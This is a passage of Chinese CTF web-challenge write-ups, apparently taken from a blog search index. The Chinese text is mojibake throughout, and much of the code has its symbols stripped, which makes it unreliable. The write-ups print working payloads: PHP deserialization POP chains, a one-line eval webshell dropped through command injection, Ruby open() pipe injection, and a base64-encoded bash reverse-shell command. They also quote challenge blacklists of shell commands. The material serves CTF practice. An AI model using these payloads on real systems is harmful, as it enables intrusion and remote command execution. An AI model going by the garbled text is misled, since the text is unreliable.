ctf;select æ²¡æœ‰selectï¼Œè®©ä½ æ‰§è¡Œä¸€å¥åˆå¦‚ä½•; . $sql . \\;system($query); å¯ä»¥ç”¨show æ¥æŸ¥è¯¢ database table column å…¶ä»–çš„ Readme|not solveæºç æ˜¯ ?phpfile_get_contents($_POST[file]); å’Œä¹‹å‰çš„ä¸ä¸€æ · ä¹‹å‰çš„echoæœ‰å›æ˜¾ ä½†æ˜¯è¿™æ¬¡æ²¡æœ‰ é‚£ä¹ˆè¿™ä¸ªå°±è¦æƒ³åŠæ³•è¯»å–åˆ°æ–‡ä»¶çš„å†…å®¹ å†æ¥æ‰“CVE-2024-2961 é‚£ä¹ˆæ²¡å›æ˜¾æ€ä¹ˆåŠæ è¿™é‡Œä½¿ç”¨ä¾§ä¿¡é“è¯»å–æ–‡ä»¶å†…å®¹ è¿™æ ·å°±å¯ä»¥ç»•è¿‡æ— å›æ˜¾çš„é™åˆ¶ æ–‡ç« :https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle https://tttang.com/archive/1395/ å·¥å…·é¡¹ç›®:https://github.com/synacktiv/php_filter_chains_oracle_exploit python3 22.py --target http://url/ --file /etc/passwd --parameter file èƒ½è¯»åˆ°æ–‡ä»¶ ä½†æ˜¯é€Ÿåº¦å¤ªæ…¢äº† æ”¹äº†è„šæœ¬ä¹Ÿæ˜¯å¾ˆæ…¢ åæ­£åé¢ç»“åˆcnextæ¥åš","tags":["CTF-wp"]},{"title":"LitCTF 2025 å¤ç°","path":"/2025/07/07/LitCTF2025wp/","content":"[LitCTF 2025]easy_fileF12æºä»£ç  script const particlesContainer = document.getElementById(particles); for (let i = 0; i 30; i++) const particle = document.createElement(div); particle.className = particle; particle.style.width = `$Math.random() * 20 + 5px`; particle.style.height = particle.style.width; particle.style.left = `$Math.random() * 100%`; particle.style.top = `$Math.random() * 100%`; particle.style.animationDelay = `$Math.random() * 5s`; particlesContainer.appendChild(particle); document.getElementById(loginForm).addEventListener(submit, function(e) e.preventDefault(); const username = this.querySelector(input[name=username]).value; const password = this.querySelector(input[name=password]).value; const encoder = new TextEncoder(); const encode = str = btoa(String.fromCharCode(...encoder.encode(str))); this.querySelector(input[name=username]).value = encode(username); this.querySelector(input[name=password]).value = encode(password); this.submit(); ); //fileæŸ¥çœ‹å¤´åƒ/script æœ‰æŸ¥çœ‹jpgçš„ç‚¹ è¿›å»å°±æ˜¯ç™»å½•æ¡† é¦–å…ˆå°è¯•å¼±å£ä»¤ ç”¨æˆ·åç…§å¸¸admin å¯†ç éšä¾¿çŒœçš„å¼±å¯†ç  è™½ç„¶é”™è¯¯ä½†æ˜¯å‘ç°å›åˆ°ç™»é™†é¡µé¢å®ƒç»™ä½ å¡«å¥½äº†å¸å· YWRtaW4æ˜¯adminçš„base64 æ‰€ä»¥æˆ‘ä»¬çŒœæµ‹å¸å·å¯†ç åº”è¯¥éƒ½æ˜¯base64è¿‡åçš„å¼±å£ä»¤ ç„¶åä½ æŠ“åŒ…ä¹Ÿèƒ½çŸ¥é“ä»–æ˜¯base64ç¼–ç  burpå­—å…¸çˆ†ç ´å³å¯ çˆ†ç ´å‡ºæ¥ä¸ºpassword ç™»é™†è¿›å»æ˜¯æ–‡ä»¶ä¸Šä¼ çš„ç‚¹ åªèƒ½ä¸Šä¼ txtå’Œjpg å¦‚æœåªèƒ½ä¸Šä¼ jpgä¸Šä¼ ä¸ªå›¾ç‰‡é©¬çœ‹çœ‹ æ£€æµ‹phpä½¿ç”¨çŸ­æ ‡ç­¾ å›¾ç‰‡é©¬æ¡ä»¶æ˜¯å¿…é¡»æœ‰æ–‡ä»¶åŒ…å« åˆšå¥½è¿™é‡Œå‰é¢æºä»£ç æœ‰ä¸€ä¸ªfileæŸ¥çœ‹å›¾ç‰‡ [LitCTF 2025]å›ã®åã¯è¿›å»å°±æ˜¯phpä»£ç  ååºåˆ—åŒ– ?phphighlight_file(__FILE__);error_reporting(0);create_function(, die(`/readflag`););class Taki private $musubi; private $magic; public function __unserialize(array $data) $this-musubi = $data[musubi]; $this-magic = $data[magic]; return ($this-musubi)(); public function __call($func,$args) (new $args[0]($args[1]))-$this-magic(); class Mitsuha private $memory; private $thread; public function __invoke() return $this-memory.$this-thread; class KatawareDoki private $soul; private $kuchikamizake; private $name; public function __toString() ($this-soul)-flag($this-kuchikamizake,$this-name); return call error!no flag!; $Litctf2025 = $_POST[Litctf2025];if(!preg_match(/^[Oa]:[\\d]+/i, $Litctf2025)) unserialize($Litctf2025);else echo æŠŠOæ”¹æˆCä¸å°±è¡Œäº†å—,ç¬¨è›‹!ï½(âˆ ãƒ»Ï‰ )âŒ’â˜†; è¿™æ˜¯é“å¾ˆå¥½çš„é¢˜ å¯¹ä¸æ“…é•¿phpåºåˆ—åŒ–çš„å¸ˆå‚…æœ‰ç‚¹éš¾ç†è§£ ä½†è¯·è€å¿ƒçœ‹å®Œ é¦–å…ˆå…ˆæ‰¾æœ€åè·å–flagçš„ç‚¹æ˜¯ create_function(â€œâ€, â€˜die(/readflag);â€™); åˆ›é€ äº†ä¸€ä¸ªåŒ¿åçš„å‡½æ•°æ¥æ‰§è¡Œè¯»å–flagçš„æ“ä½œ æ‰€ä»¥æˆ‘ä»¬è¦è¯»å–flagå°±å¾—é€šè¿‡ååºåˆ—åŒ–è°ƒç”¨è¿™ä¸ªåŒ¿åå‡½æ•°ã€‚ æ‰€ä»¥ç°åœ¨æœ‰å‡ ä¸ªç‚¹éœ€è¦è§£å†³: 1.åŒ¿åå‡½æ•°çš„åå­— 2.æ€ä¹ˆè°ƒç”¨åŒ¿åå‡½æ•° 3.ç»•è¿‡æœ€åä¸€æ­¥ 1. ?php $a = create_function(,die(` /readflag`););var_dump($a);#\\000lambda_1 è¾“å‡ºå°±æ˜¯å…¶åå­— ä½†æ˜¯ç½‘é¡µæ¯åˆ·æ–°ä¸€æ¬¡ å‡½æ•°ååçš„æ•°å­—å°±ä¼šåŠ 1 2. é“¾å­é¡ºåºå¾ˆç®€å•,æ˜¯: Taki::__unserialize-Mitsuha::__invoke-KatawareDoki::__toString-Taki::__call ä»”ç»†çœ‹ public function __call($func,$args) (new $args[0]($args[1]))-$this-magic(); new $args[0]($args[1])ç”¨è°ƒç”¨æ—¶ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•° $args[0] ä½œä¸ºç±»åï¼ŒåŠ¨æ€åˆ›å»ºè¿™ä¸ªç±»çš„å®ä¾‹ã€‚ç”¨ç¬¬äºŒä¸ªå‚æ•° $args[1] ä½œä¸ºè¯¥ç±»æ„é€ å‡½æ•°çš„å‚æ•°ã€‚ -$this-magic()è°ƒç”¨æ–°å®ä¾‹ä¸­ï¼Œåå­—ä¸º $this-magic çš„æ–¹æ³•ï¼Œä¸”æ— å‚æ•°ã€‚ æ‰€ä»¥è¿™é‡Œè€ƒäº†åŸç”Ÿç±»çš„çŸ¥è¯†ç‚¹ ä½¿ç”¨ReflectionFunctionçš„invokeæ–¹æ³•è°ƒç”¨æ— å‚å‡½æ•° ç†è§£: $rf = new ReflectionFunction($closure);$rf-invoke() æ„ä¸ºè°ƒç”¨$closureè¿™ä¸ªå‡½æ•°ã€‚é‚£ä¹ˆå›åˆ°æ­¤é¢˜ï¼Œå³æ˜¯è°ƒç”¨lambda_1è¿™ä¸ªå‡½æ•°ï¼Œè¯»åˆ°flagã€‚ $funä¼šè¢«èµ‹å€¼ä¸ºflag(),$argsåˆ™æ˜¯flag()é‡Œçš„ä¸œè¥¿ 3. ç»•è¿‡ä½¿ç”¨ç±»å¯¹é“¾å­è¿›è¡ŒåŒ…è£…ï¼Œè¿™æ ·å¼€å¤´çš„Oå°±ä¼šæ›¿æ¢ä¸ºCï¼Œä»¥æ­¤ç»•è¿‡ã€‚ä»¥ä¸‹è¿™äº›åŸç”Ÿç±»æ˜¯Cå¼€å¤´ ArrayObject::unserializeArrayIterator::unserializeRecursiveArrayIterator::unserializeSplDoublyLinkedList::unserializeSplQueue::unserializeSplStack::unserializeSplObjectStorage::unserialize POPé“¾: ?phpclass Taki public $musubi; public $magic = invoke;class Mitsuha public $memory; public $thread;class KatawareDoki public $soul; public $kuchikamizake = ReflectionFunction; public $name = \\000lambda_1;$a = new Taki();$b = new Mitsuha();$c = new KatawareDoki();$a - musubi = $b;$b - thread = $c;$c - soul = $a;$d = array(sauy=$a); //è¿™é‡Œéšä¾¿å–ä¸€ä¸ªé”®åå°±å¥½ï¼Œæ„ä¹‰å°±æ˜¯ææˆæ•°ç»„$e = new ArrayObject($d); //ä½¿ç”¨åŸç”Ÿç±»è¿›è¡Œå°è£…æ¥è¿›è¡Œç»•è¿‡echo urlencode(serialize($e));?#Litctf2025=C%3A11%3A%22ArrayObject%22%3A244%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22sauy%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A6%3A%22memory%22%3BN%3Bs%3A6%3A%22thread%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A4%3A%22soul%22%3Br%3A4%3Bs%3A13%3A%22kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A4%3A%22name%22%3Bs%3A9%3A%22%00lambda_1%22%3B%7D%7Ds%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D è¯·æ³¨æ„æœ¬é¢˜phpç‰ˆæœ¬æ˜¯php7.4 ä½†æ˜¯è¿è¡Œé“¾å­è¯·åœ¨PHP 5.3ç‰ˆæœ¬ä¸‹è¿è¡Œï¼ˆæ¨èä½¿ç”¨phpstudy åˆ‡æ¢phpç‰ˆæœ¬æ–¹ä¾¿) åŸå› æ˜¯ï¼šPHPç‰ˆæœ¬å·®å¼‚å¯¼è‡´çš„ArrayObjectåºåˆ—åŒ–æ ¼å¼å˜åŒ–ã€‚åœ¨PHP 5.6+åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒArrayObjectçš„åºåˆ—åŒ–ç»“æ„åŒ…å«ä¸‰éƒ¨åˆ†ï¼ˆæ ‡å¿—ä½ã€å­˜å‚¨æ•°ç»„ã€è¿­ä»£å™¨ä¿¡æ¯ï¼‰ï¼Œè€Œæ—§ç‰ˆPHPï¼ˆå¦‚5.3ï¼‰åˆ™ä½¿ç”¨ä¸åŒçš„è‡ªå®šä¹‰æ ¼å¼ï¼ˆä»¥C:å¼€å¤´ï¼‰â€“æ¥è‡ªDEEPSEEK https://chenxi9981.github.io/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/ (phpåºåˆ—åŒ–çŸ¥è¯†æ€»ç»“)","tags":["CTF-wp"]},{"title":"2025å¹´å¤å­£ä¸ªäººæŒ‘æˆ˜èµ›PolarCTF-WEB","path":"/2025/06/29/2025å¹´å¤å­£ä¸ªäººæŒ‘æˆ˜èµ›PolarCTF-WEB/","content":"ez_checkjavaé¢˜æš‚æ—¶ä¸ä¼š ç‹—é»‘å­çš„å˜é‡è€ƒç‚¹:æˆªå–å’Œæ‹¼æ¥$PATHä¸­çš„å­—ç¬¦æ„é€ å‘½ä»¤ æ„é€ æ–¹æ³•: $PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin$PATJl/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin æ„é€ lsè¿™ä¸ªå‘½ä»¤çš„ç»“æœ $PATH:5:1 //l$PATH:2:1 //s$PATH:5:1$PATH:2:1 //ls//ç¬¬ä¸€ä¸ªå­—æ¯ä»£è¡¨PATHé‡Œçš„ç¬¬å‡ ä¸ªå­—ç¬¦ï¼Œä»0å¼€å§‹ï¼Œå’Œæ•°ç»„ä¸€æ · ç¬¬äºŒä¸ªæ˜¯ä»£è¡¨æˆªå–å‡ ä¸ªå­—ç¬¦ dirsearchæ‰«æ æ‰«å‡ºadmin.php å¯ä»¥çœ‹åˆ°PATHçš„å†…å®¹ äºæ˜¯ä¹å°±å¼€å§‹æ‹¼æ¥è¦è¢«æ›¿æ¢çš„å­—æ¯ $PATH:8;1at /* cat * ç‹—é»‘å­çš„éšè—è¿›å»åªæœ‰ä¸€ä¸ªåˆ·æ–°æŒ‰é’® dirsearchä¹Ÿæ²¡æœ‰çœ‹å‡ºä¸œè¥¿ F12ä¹ æƒ¯ çœ‹åˆ°cmdå‚æ•° æ‰§è¡Œå‘½ä»¤ æˆåŠŸ ç¦äº† envçœ‹çœ‹ ç›´æ¥å‡ºå‡flagï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ ctrl+uå¾—åˆ°æºç  1\t?php 2\t// æ£€æŸ¥æ˜¯å¦æœ‰POSTè¯·æ±‚ä¸”åŒ…å«cmdå‚æ•° 3\tif ($_SERVER[REQUEST_METHOD] === POST isset($_POST[cmd])) 4 $cmd = $_POST[cmd]; 5 6 // å¼ºåˆ¶åˆ‡æ¢åˆ°å½“å‰ç›®å½•ï¼ˆé‡è¦å®‰å…¨æªæ–½ï¼‰ 7 chdir(dirname(__FILE__)); 8 9 // è¿‡æ»¤å±é™©å­—ç¬¦å’Œå…³é”®å­—10 $blacklist = array(f,g,cat, flag, , |, `,,,in,nd,de,ex,head,tac,le,ss,mo,re,..,/,\\\\);11 $is_dangerous = false;12 13 // æ£€æŸ¥å‘½ä»¤æ˜¯å¦åŒ…å«é»‘åå•ä¸­çš„ä»»ä½•é¡¹14 foreach ($blacklist as $item) 15 if (stripos($cmd, $item) !== false) 16 $is_dangerous = true;17 break;18 19 20 21 // å¦‚æœæ£€æµ‹åˆ°å±é™©æ“ä½œï¼Œå›æ˜¾é”™è¯¯ä¿¡æ¯22 if ($is_dangerous) 23 echo ä¸æ”¯æŒå±é™©æ“ä½œ;24 else 25 // æ£€æŸ¥è¿‡æ»¤åçš„å‘½ä»¤æ˜¯å¦ä¸ºç©º26 if (!empty($cmd)) 27 // æ‰§è¡Œè¿‡æ»¤åçš„å‘½ä»¤28 system($cmd);29 30 31\t32\t? ç›´æ¥å†™æœ¨é©¬å§ cmd=echo ?php @eval($_POST[a]);? a.php antswordè¿æ¥æˆåŠŸ æ‰§è¡Œå‘½ä»¤å³å¯ ç®€å•çš„é“¾å­å¥½ç®€å•çš„èœé¸Ÿååºåˆ—åŒ– ?phpclass A public $cmd = cat /flag; function __destruct() if (isset($this-cmd)) system($this-cmd); $a = new A();echo serialize($a);? æ¸—é€ä¹‹ç‹é¦–å…ˆè¿›å»æ˜¯ç™»å½•ç•Œé¢ å¸å·admin éšä¾¿çŒœäº†ä¸€ä¸ªå¼±å£ä»¤ æç¤ºå¯†ç é”™è¯¯ è‡ªå·±æ‹¿å­—å…¸å»çˆ†ä¹Ÿæ²¡çˆ†å‡ºæ¥ äºæ˜¯dirsearchæ‰«äº†ä¸€ä¸‹ç›®å½• å¾—åˆ°æœ‰ç”¨çš„ä¸¤ä¸ªè·¯å¾„ è®¿é—®admin.phpå¾—åˆ°base64åŠ å¯†çš„å¯†æ–‡ è§£å¯†åä¸ºpolarctf www.zipæºç æ³„éœ² ä¸‹è½½ä¸‹æ¥å‘ç°éœ€è¦å¯†ç  äºæ˜¯è¾“å…¥polarctf æˆåŠŸè§£å¯† æ‰“å¼€å‘ç°æ˜¯ä¸ªå¼±å¯†ç å­—å…¸ äºæ˜¯æˆ‘ä»¬å°±ä½¿ç”¨ä»–çš„å­—å…¸ çˆ†å‡ºæ¥å¯†ç æ˜¯admin789 æˆåŠŸç™»å½• è¿›å…¥ç•Œé¢ç‚¹å‡»å‘ç°æç¤ºéæ³•çš„æ–‡ä»¶åŒ…å« é‚£å°±æ˜¯æ–‡ä»¶åŒ…å« /polarctf/?page=php://filter/convert.base64-encode/resource=about.php /polarctf/?page=php://filter/convert.base64-encode/resource=hint.php æç¤ºæœ‰æ–‡ä»¶ä¸Šä¼ ç•Œé¢ ç°åœ¨å°±æ˜¯æ‰¾æ–‡ä»¶ä¸Šä¼ å…¥å£ è¿™é‡Œä½ å¯ä»¥dirsearchæ‰« æ‰«å‡ºæ¥æ–‡ä»¶ä¸Šä¼ è·¯å¾„ å¾ˆç®€å•çš„æ–‡ä»¶ä¸Šä¼  æ”¹ä¸€ä¸‹content-typeå³å¯ antswordè¿æ¥å³å¯ çœŸå‡ECRéé¢„æœŸ: è¿›å»å°±æ˜¯æºä»£ç  ç¦äº†ä¸€äº›æŒ‡ä»¤ ä½†æ˜¯ä½ å¯ä»¥ä½¿ç”¨è½¬ä¹‰ç»•è¿‡ ?cmd=ca\\t /fla\\g é¢„æœŸ: å…ˆè®¿é—®flag.php å¾—åˆ° KeY=aGVpZ291emk= USERID=p8Sjk58 DATA=2JSklNA= å¦‚æœè¿™ä¹Ÿä¸æ˜ç™½çš„è¯ï¼ŒåŠ ä¸Šåç¼€è¯•ä¸€è¯• ç¬¬ä¸€ä¸ªè§£ç åå¾—åˆ°heigouzi å¸¦ä¸Šåç¼€phpå¯ä»¥è®¿é—® å‚æ•°åº”è¯¥ä¹Ÿæ˜¯cmd æ‰§è¡Œå‘½ä»¤ls å‘ç°èƒ½å¤Ÿè¯»å–åˆ°è¿™ä¸ªç½‘ç«™çš„æ–‡ä»¶ cainiao.txtflag.phpheigouzi.phpindex.phpshe11.php æŸ¥çœ‹cainiao.txt æ˜¯ä¸ªè§£å¯†å‡½æ•° ç”¨å°±å¥½ æ•°æ®:KeY=aGVpZ291emk= USERID=p8Sjk58 DATA=2JSklNA= ?phpclass Decryption public function decrypt($data, $key) $char = ; $str = ; $key = md5($key); $x = 0; $data = base64_decode($data); $len = strlen($data); $l = strlen($key); for ($i = 0; $i $len; $i++) if ($x == $l) $x = 0; $char.= substr($key, $x, 1); $x++; for ($i = 0; $i $len; $i++) $str.= chr(ord($data[$i]) - ord($char[$i])); return $str; $data = 2JSklNA=;$key = answer; $decryption = new Decryption();$result = $decryption-decrypt($data, $key);echo $result;? è§£å¯†å‡ºæ¥æ˜¯wanan æ˜¯she11.phpçš„å¯†ç  antswordè¿æ¥å³å¯ nukaka_ser2æ²¡ä»€ä¹ˆå¥½è¯´çš„ ååºåˆ—åŒ–å®¡é“¾å­ çœ‹èµ·æ¥å¾ˆé•¿ å…¶å®ä¸€ä¸‹å°±åšå‡ºäº† popé“¾å­å¦‚ä¸‹ ?phpclass FlagReader private $logfile; protected $content;class DataValidator class FakeDanger private $buffer;class VulnerableClass public $logger; private $debugMode = true;$A = new VulnerableClass();$A - logger = new FlagReader();echo base64_encode(serialize($A));? ghost_renderè¯´æ˜¯mdæ¸²æŸ“ æŠ“åŒ…è‡ªå·±burpå°è¯• æ¸²æŸ“æˆ‘å°±æƒ³åˆ°ssti æµ‹äº†ä¸‹è¿˜çœŸæ˜¯ éå¸¸ç®€å•çš„ssti æ²¡æœ‰è¿‡æ»¤ ç›´æ¥æ‰§è¡Œå‘½ä»¤å³å¯ ä¸è¿‡flagè·¯å¾„å¾—é¦–å…ˆå»è¯»å–app.pyæ‰å¯ä»¥çŸ¥é“flagå­˜å‚¨åœ¨varsecret_flagä¸‹ rceå‘½ä»¤æ‰§è¡Œç³»ç»Ÿlsè¢«è¿‡æ»¤ è¯•è¯•è½¬ä¹‰ è®¿é—®å‘f1ag.phpå¾—åˆ° æ—¢ç„¶ä½ æ‰¾åˆ°è¿™é‡Œäº†é‚£å°±å‘Šè¯‰ä½ ç‚¹ä¸œè¥¿å§ å¼‚æˆ–åå®ƒå¥½åƒæ”¹åå«XOR_KEYï¼Œç»™ä»–ä¼ ä¸ªå‚è¯•ä¸€è¯•å‘¢ï¼Œå¯¹äº†ï¼Œå’±ä»¬çš„é¶åœºå«ä»€ä¹ˆæ¥ç€ï¼ŸğŸ¤” payload env XOR_KEYPolar easyReadå—¯å¾ˆç®€å•çš„é“¾å­ ä½†æ˜¯æ‹¿flagå¾ˆç¥ç» flagæˆ‘æ‰§è¡Œå‘½ä»¤æ²¡æ‰¾åˆ° è¿™é“é¢˜flagæ˜¯flag{HelloHellorun} exp ?phpClass Read public $source; public $is;class Help public $source; public $str;class Polar private $var = system(ls /);;class Doit public $is; private $source;$a = new Read(); $a1 = new Read();$a - source = $a1;$a1 - is = new Help();$a1 - is - str = new Doit();$a1 - is - str - is = new Polar();echo urlencode(serialize($a));? å‘½è¿çŸ³ä¹‹é—¨è¿›å»å°±æ˜¯éªŒè¯å¯†ç  ctrl+uå‘ç°æç¤º 5pyJ5pe25YCZ77yM6aqM6K+B56CB5piv5ZCm5aW95L2/5LiN6YeN6KaB ç„¶ådirsearchæ‰«æå‘ç° passwrod.txt ç›´æ¥burpå¼€çˆ† éªŒè¯ç è¯´æ˜¯ä¸é‡è¦ éšä¾¿å¡« ç»“æœè¿˜æ˜¯è¦çŒœä¸‡èƒ½éªŒè¯ç 0000 ç›´æ¥è¿›ç¬¬äºŒæ­¥ è¿˜æ˜¯çˆ†å¯†ç  å­—å…¸æ˜¯æ‹¿åˆ°çš„password.txtå†…å®¹ çˆ†å‡ºæ¥å¯†ç æ˜¯ huan9le1Sam0 ç›´æ¥è¿‡äººæœºéªŒè¯å³å¯å¾—åˆ°flag ä½ ä¹Ÿç©é“²å—é¦–å…ˆå…ˆæ³¨å†Œ ç™»é™†è¿›å»çœ‹åˆ°ctrl+uçœ‹åˆ°æç¤º dirsearchæ‰«æ æ‰«æå‡ºæ¥å¥½å‡ ä¸ªæ•æ„Ÿè·¯å¾„ è®¿é—®login_admin.html çœ‹åˆ°ç®¡ç†å‘˜ç™»å½•ç•Œé¢ ç»“åˆæç¤º ä¼ªé€ cookie ä¿®æ”¹cookieå¦‚ä¸‹å›¾ å†å»è®¿é—®admin_login.php","tags":["CTF-wp"]},{"title":"webåˆ·é¢˜â€”â€”æŒç»­æ›´æ–°","path":"/2025/06/09/BUU-åˆ·é¢˜/","content":"[ç¬¬äº”ç©ºé—´ 2021]PNGå›¾ç‰‡è½¬æ¢å™¨æœ‰æºç ï¼Œrubyå†™çš„ï¼Œä¸æ˜¯å¸¸è§çš„è¯­è¨€é¦–å…ˆè”æƒ³cveï¼Œå…ˆçœ‹æºç ã€‚ require sinatrarequire digestrequire base64get / do open(./view/index.html, r).read()endget /upload do open(./view/upload.html, r).read()endpost /upload do unless params[:file] params[:file][:tempfile] params[:file][:filename] params[:file][:filename].split(.)[-1] == png return scriptalert(error);location.href=/upload;/script end begin filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + .png open(filename, wb) |f| f.write open(params[:file][:tempfile],r).read() Upload success, file stored at #filename rescue something wrong endendget /convert do open(./view/convert.html, r).read()endpost /convert do begin unless params[file] return scriptalert(error);location.href=/convert;/script end file = params[file] unless file.index(..) == nil file.index(/) == nil file =~ /^(.+)\\.png$/ return scriptalert(dont hack me);/script end res = open(file, r).read() headers Content-Type = text/html; charset=utf-8 var img = document.createElement(\\img\\); img.src= \\data:image/png;base64, + Base64.encode64(res).gsub(/\\s*/, ) + \\; rescue something wrong endend åšäº†ä¸¤ä¸ªåŠŸèƒ½ç‚¹ï¼Œuploadå’Œconvertã€‚å®¡è®¡ä¸‹æ¥é™åˆ¶çš„å¾ˆæ­»ï¼Œå”¯ä¸€åˆ©ç”¨ç‚¹å°±æ˜¯openè¿™æ¯”è¾ƒå¯ç–‘ï¼Œè€ƒè™‘cveï¼Œrubyç»“åˆopenæœç„¶æœ‰cveã€‚ å‚è€ƒCVE-2017-17405 https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/middleware/Ruby-NetFTP-%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2017-17405.md åŸç†: Ruby-Net::FTP æ¨¡å—æ˜¯ä¸€ä¸ªFTPå®¢æˆ·ç«¯ï¼Œä¸Šä¼ æ–‡ä»¶è¿‡ç¨‹ä¸­ä½¿ç”¨äº†openå‡½æ•°ã€‚openå‡½æ•°åœ¨rubyä¸­æ˜¯å€Ÿç”¨ç³»ç»Ÿå‘½ä»¤æ¥æ‰“å¼€æ–‡ä»¶ï¼Œæ„å‘³ç€å¦‚æœæ²¡æœ‰åšè¿‡æ»¤ï¼Œæˆ‘ä»¬èƒ½åˆ©ç”¨è¿™ä¸ªç‚¹æ¥æ‰§è¡Œå‘½ä»¤ã€‚ payload: å¦‚æœ+path+ä»¥ä¸€ä¸ªç®¡é“å­—ç¬¦ï¼ˆ|ï¼‰å¼€å¤´ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œé€šè¿‡ä¸€å¯¹ç®¡é“è¿æ¥åˆ°è°ƒç”¨è€…ã€‚ è¿”å›çš„IOå¯¹è±¡å¯ç”¨äºå‘è¯¥å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥å†™å…¥å’Œä»æ ‡å‡†è¾“å‡ºè¯»å–ã€‚ file=|bash -c env #.pngfile=|`echo ZW52|base64 -d` e7e7eed2fbf6094265aebdf5344bfb8c.pngfile=|bash$IFS-c$IFSecho,YmFzaCAtaSA...|base64,-d|bash,-i [ç½‘é¼æ¯ 2018]Fakebookè¿›å»æ²¡æ‰¾åˆ°ä»€ä¹ˆåˆ©ç”¨ç‚¹ï¼Œdirsearchæ‰«æï¼Œæœ‰robots.txt è®¿é—®å¾—åˆ°user.php.bak ?phpclass UserInfo public $name = ; public $age = 0; public $blog = ; public function __construct($name, $age, $blog) $this-name = $name; $this-age = (int)$age; $this-blog = $blog; function get($url) $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) return 404; curl_close($ch); return $output; public function getBlogContents () return $this-get($this-blog); public function isValidBlog () $blog = $this-blog; return preg_match(/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]2,6(\\:[0-9]+)?(\\/\\S*)?$/i, $blog); [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpwebè¿›å»å°±æ˜¯ä¸€å¼ è´´è„¸å¤§å›¾ éšä¾¿æŠ“åŒ…çœ‹åˆ°å‚æ•° éšä¾¿è¾“å‘ç° call_user_funè¿™ä¸ªè¶…æ˜æ˜¾çš„phpå‡½æ•° é¦–å…ˆä½¿ç”¨file_get_contentsç»“åˆä¼ªåè®®è¯»å–æºç  (è¯»æºç ä¸æ­¢ä¸€ä¸ªæ–¹æ³• è¿˜æœ‰funhighlight_filepindex.php) ?php$disable_fun = array(exec,shell_exec,system,passthru,proc_open,show_source,phpinfo,popen,dl,eval,proc_terminate,touch,escapeshellcmd,escapeshellarg,assert,substr_replace,call_user_func_array,call_user_func,array_filter, array_walk, array_map,registregister_shutdown_function,register_tick_function,filter_var, filter_var_array, uasort, uksort, array_reduce,array_walk, array_walk_recursive,pcntl_exec,fopen,fwrite,file_put_contents); function gettime($func, $p) $result = call_user_func($func, $p); $a= gettype($result); if ($a == string) return $result; else return ; class Test var $p = Y-m-d h:i:s a; var $func = date; function __destruct() if ($this-func != ) echo gettime($this-func, $this-p); $func = $_REQUEST[func]; $p = $_REQUEST[p]; if ($func != null) $func = strtolower($func); if (!in_array($func,$disable_fun)) echo gettime($func, $p); else die(Hacker...); ? è¿™é‡Œæœ‰ä¸¤ä¸ªæ–¹æ³•: æ–¹æ³•1ï¼šunserilizeååºåˆ—åŒ–__destruc__é­”æœ¯æ–¹æ³•å½“ç±»è¢«é”€æ¯ä¼šè‡ªåŠ¨è§¦å‘ ?phpclass Test var $p = find / -name flag*; var $func = system;$a = new Test;echo serialize($a);? çœ‹åˆ°å¯ç–‘è·¯å¾„ tmpflagoefiu4r93 ?phpclass Test var $p = cat /tmp/flagoefiu4r93; var $func = system;$a = new Test;echo serialize($a);? å¾—é“flag æ–¹æ³•2ï¼šå‘½åç©ºé—´æ–¹æ³•åŸç†åœ¨phpä¸­ï¼Œå‡½æ•°åŠ ä¸Š\\å·ä¸ä¼šå½±å“å‡½æ•°æœ¬èº«ï¼Œå› ä¸ºin_arrayå‡½æ•°è¿‡æ»¤ä¸å¤Ÿä¸¥è°¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åŠ ä¸Š\\å·æ¥ç»•è¿‡ã€‚ func\\systempfind -name fllag* ç„¶åæ­£å¸¸æ‰§è¡Œå‘½ä»¤å°±è¡Œ [å®‰æ´µæ¯ 2019]easy_serialize_php?php$function = @$_GET[f];function filter($img) $filter_arr = array(php,flag,php5,php4,fl1g); $filter = /.implode(|,$filter_arr)./i; return preg_replace($filter,,$img);if($_SESSION) unset($_SESSION);$_SESSION[user] = guest;$_SESSION[function] = $function;extract($_POST);if(!$function) echo a href=index.php?f=highlight_filesource_code/a;if(!$_GET[img_path]) $_SESSION[img] = base64_encode(guest_img.png);else $_SESSION[img] = sha1(base64_encode($_GET[img_path]));$serialize_info = filter(serialize($_SESSION)); //å¾—åˆ°åºåˆ—åŒ–çš„æ•°æ®if($function == highlight_file) highlight_file(index.php);else if($function == phpinfo) eval(phpinfo();); //maybe you can find something in here!else if($function == show_image) $userinfo = unserialize($serialize_info); //ååºåˆ—åŒ– echo file_get_contents(base64_decode($userinfo[img])); 